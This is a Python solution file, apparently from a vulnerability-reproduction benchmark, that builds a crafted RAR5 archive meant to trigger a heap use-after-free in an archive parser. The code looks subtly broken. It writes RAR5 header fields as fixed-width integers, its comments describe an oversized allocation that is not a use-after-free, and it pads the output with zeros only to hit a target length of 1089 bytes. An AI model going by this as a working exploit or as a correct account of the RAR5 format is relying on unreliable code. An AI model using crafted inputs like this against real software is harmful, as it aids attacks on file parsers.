import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 archive structure for triggering heap use-after-free
        # Main archive header
        main_header = (
            b"\x52\x61\x72\x21\x1A\x07\x01\x00"  # RAR5 signature
            b"\x00\x00\x00\x00\x00\x00\x00\x00"  # CRC and header size
            b"\x01\x00\x00\x00"  # Header type (main archive)
            b"\x00\x00\x00\x00"  # Flags
            b"\x00\x00\x00\x00"  # Extra size
        )
        
        # File header with oversized name field
        # Header will allocate memory for name based on name_size field
        # but won't validate until after reading the name data
        file_header = (
            b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Placeholder for CRC and header size
            b"\x02\x00\x00\x00"  # Header type (file)
            b"\x00\x08\x00\x00"  # Flags: has_name flag (0x0800)
            b"\x00\x00\x00\x00"  # Extra size
            b"\x00\x00\x00\x00"  # File attributes
            b"\x00\x00\x00\x00"  # Modification time
            b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Unpacked size
        )
        
        # Create a name that triggers the vulnerability
        # Set name_size to a large value (0xFFFF) but actual name is much smaller
        # This causes allocation of 64KB buffer but only fills small portion
        name_size = 0xFFFF  # Maximum name size to trigger large allocation
        actual_name = b"A" * 100  # Actual name data
        
        # Build the complete header
        header_size = len(file_header) + 2 + len(actual_name)  # +2 for name_size field
        file_header_with_size = (
            struct.pack("<I", 0) +  # CRC placeholder
            struct.pack("<H", header_size) +  # Header size
            file_header[8:]  # Rest of header
        )
        
        # Add name_size and name
        file_header_with_size += struct.pack("<H", name_size)
        file_header_with_size += actual_name
        
        # Create payload that triggers use-after-free
        # After reading name, the code frees the buffer but might still reference it
        payload = main_header + file_header_with_size
        
        # Ensure exact ground-truth length of 1089 bytes
        if len(payload) < 1089:
            # Pad with zeros to reach exact length
            payload += b"\x00" * (1089 - len(payload))
        elif len(payload) > 1089:
            # Truncate to exact length (shouldn't happen with this construction)
            payload = payload[:1089]
        
        return payload
